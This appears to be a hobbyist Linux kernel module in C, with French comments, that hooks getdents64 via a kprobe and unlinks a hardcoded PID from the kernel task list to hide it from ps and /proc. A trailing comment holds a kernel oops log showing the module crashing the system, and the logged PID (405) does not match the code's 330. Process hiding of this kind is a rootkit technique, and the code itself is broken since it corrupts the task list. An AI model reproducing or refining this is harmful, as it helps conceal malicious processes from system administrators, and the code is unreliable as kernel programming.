#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/list.h>

static struct kprobe kp;
static int hidden_pid = 330;  // Le PID à cacher

// Fonction pour masquer un processus
static void hide_process(struct task_struct *task)
{
    if (task->pid == hidden_pid) {
        // Masquer le processus en supprimant les liens dans les listes chaînées
        list_del(&task->tasks);  // Retirer le processus de la liste globale des tâches
        printk(KERN_INFO "kprobe: Processus avec PID %d caché\n", hidden_pid);
    }
}

// Fonction appelée avant chaque appel à getdents64
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    struct task_struct *task;

    // Parcours de la liste des processus actifs
    for_each_process(task) {
        hide_process(task);  // Cacher les processus correspondant au PID à masquer
    }

    return 0;
}

// Initialisation du module
static int __init kprobe_init(void)
{
    kp.pre_handler = handler_pre;
    kp.symbol_name = "__x64_sys_getdents64";  // Fonction de lecture de /proc

    // Enregistrement du kprobe
    if (register_kprobe(&kp) < 0) {
        printk(KERN_ERR "kprobe: échec de l'enregistrement\n");
        return -1;
    }
    printk(KERN_INFO "kprobe: enregistré avec succès\n");
    return 0;
}

// Sortie du module
static void __exit kprobe_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "kprobe: désenregistré\n");
}

module_init(kprobe_init);
module_exit(kprobe_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Marouane");
MODULE_DESCRIPTION("Module pour cacher un processus du ps et de /proc");





/*
(none):~# ps
PID   USER     TIME  COMMAND
[  398.827685] kprobe: Processus avec PID 405 cachÃ©
[  398.828539] Oops: general protection fault, probably for non-canonical address 0xdead0000000001d0: 00I
[  398.828795] CPU: 0 PID: 447 Comm: ps Tainted: G           O       6.10.11 #1
[  398.828897] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  398.829077] RIP: 0010:handler_pre+0x4a/0x90 [hide_pid]
[  398.829516] Code: 48 bd 22 01 00 00 00 00 ad de 53 48 8d 98 88 fb ff ff eb 16 48 8b 83 78 04 00 00 481
[  398.829813] RSP: 0018:ffffb042802d3e48 EFLAGS: 00000297
[  398.829915] RAX: dead000000000100 RBX: deacfffffffffc88 RCX: 00000000ffffdfff
[  398.830021] RDX: 0000000000000000 RSI: 00000000ffffffea RDI: 0000000000000001
[  398.830133] RBP: dead000000000122 R08: ffffffffab938848 R09: 00000000ffffdfff
[  398.830238] R10: ffffffffab858860 R11: ffffffffab908860 R12: dead000000000100
[  398.830345] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  398.830479] FS:  00007fa904faab28(0000) GS:ffff9ec0c7a00000(0000) knlGS:0000000000000000
[  398.830611] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  398.830703] CR2: 00007fa904eff2d8 CR3: 0000000001cfc000 CR4: 00000000000006f0
[  398.830857] Call Trace:
[  398.831327]  <TASK>
[  398.831502]  ? die_addr+0x32/0x90
[  398.831622]  ? exc_general_protection+0x1b7/0x3b0
[  398.831694]  ? asm_exc_general_protection+0x26/0x30
[  398.831808]  ? handler_pre+0x4a/0x90 [hide_pid]
[  398.831870]  ? handler_pre+0x7c/0x90 [hide_pid]
[  398.831948]  opt_pre_handler+0x3f/0x70
[  398.832049]  optimized_callback+0x7a/0xa0
[  398.832129]  0xffffffffc032c034
[  398.832203]  ? __x64_sys_getdents64+0x5/0x120
[  398.832269]  ? do_syscall_64+0x9e/0x1a0
[  398.832324]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  398.832478] RIP: 0033:0x7fa904f470a3
[  398.832577] Code: 48 01 f0 0f b7 48 10 01 ca 41 89 50 0c 48 8b 50 08 49 89 10 5b c3 48 63 7f 08 49 8d0
[  398.832790] RSP: 002b:00007ffca01412a0 EFLAGS: 00000246 ORIG_RAX: 00000000000000d9
[  398.832896] RAX: ffffffffffffffda RBX: 00007fa904fab8b0 RCX: 00007fa904f470a3
[  398.832991] RDX: 0000000000000800 RSI: 00007fa904efead8 RDI: 0000000000000003
[  398.833079] RBP: 0000000000003031 R08: 00007fa904efeac0 R09: 000056017a21b14c
[  398.833171] R10: 0000000000000007 R11: 0000000000000246 R12: 0000560154428076
[  398.833259] R13: 00005601544446d8 R14: 0000560154428379 R15: 00007fa904faab5c
[  398.833368]  </TASK>
[  398.833420] Modules linked in: hide_pid(O)
[  398.833774] ---[ end trace 0000000000000000 ]---
[  398.833844] RIP: 0010:handler_pre+0x4a/0x90 [hide_pid]
[  398.833909] Code: 48 bd 22 01 00 00 00 00 ad de 53 48 8d 98 88 fb ff ff eb 16 48 8b 83 78 04 00 00 481
[  398.834218] RSP: 0018:ffffb042802d3e48 EFLAGS: 00000297
[  398.834296] RAX: dead000000000100 RBX: deacfffffffffc88 RCX: 00000000ffffdfff
[  398.834393] RDX: 0000000000000000 RSI: 00000000ffffffea RDI: 0000000000000001
[  398.834496] RBP: dead000000000122 R08: ffffffffab938848 R09: 00000000ffffdfff
[  398.834557] R10: ffffffffab858860 R11: ffffffffab908860 R12: dead000000000100
[  398.834657] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  398.834755] FS:  00007fa904faab28(0000) GS:ffff9ec0c7a00000(0000) knlGS:0000000000000000
[  398.834866] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  398.834949] CR2: 00007fa904eff2d8 CR3: 0000000001cfc000 CR4: 00000000000006f0
[  398.835098] note: ps[447] exited with preempt_count 1
Segmentation fault
*/
